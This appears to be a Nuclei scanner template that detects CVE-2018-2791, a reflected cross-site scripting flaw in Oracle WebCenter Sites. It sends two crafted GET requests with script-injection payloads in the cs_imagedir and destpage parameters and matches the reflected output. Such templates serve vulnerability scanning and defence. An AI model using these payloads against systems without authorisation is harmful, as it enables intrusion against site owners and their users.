id: CVE-2018-2791

info:
  name: Oracle Fusion Middleware WebCenter Sites - Cross-Site Scripting
  author: madrobot,leovalcante
  severity: high
  description: The Oracle WebCenter Sites component of Oracle Fusion Middleware is susceptible to multiple instances of cross-site scripting that could allow unauthenticated attackers with network access via HTTP to compromise Oracle WebCenter Sites. Impacted versions that are affected are 11.1.1.8.0, 12.2.1.2.0 and 12.2.1.3.0. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Oracle WebCenter Sites, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Oracle WebCenter Sites accessible data as well as unauthorized update, insert or delete access to some of Oracle WebCenter Sites accessible data.
  reference:
    - http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html
    - http://web.archive.org/web/20211206165005/https://securitytracker.com/id/1040695
    - http://web.archive.org/web/20210124161821/https://www.securityfocus.com/bid/103800/
    - https://www.exploit-db.com/exploits/44752/
    - https://outpost24.com/blog/Vulnerabilities-discovered-in-Oracle-WebCenter-Sites
    - https://nvd.nist.gov/vuln/detail/CVE-2018-2791
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
    cvss-score: 8.2
    cve-id: CVE-2018-2791
  tags: cve,cve2018,oracle,xss,wcs

requests:
  - raw:
      - |
        GET /cs/Satellite?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
        Host: {{BaseURL}}

      - |
        GET /cs/Satellite?destpage="<h1xxx"><script>alert(document.domain)</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError HTTP/1.1
        Host: {{BaseURL}}

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - '<script>alert(document.domain)</script>/graphics/common/screen/dotclear.gif'

      - type: word
        part: body
        words:
          - '<script>alert(24)</script>'
          - 'Missing translation key'
        condition: and

# Enhanced by mp on 2022/04/20
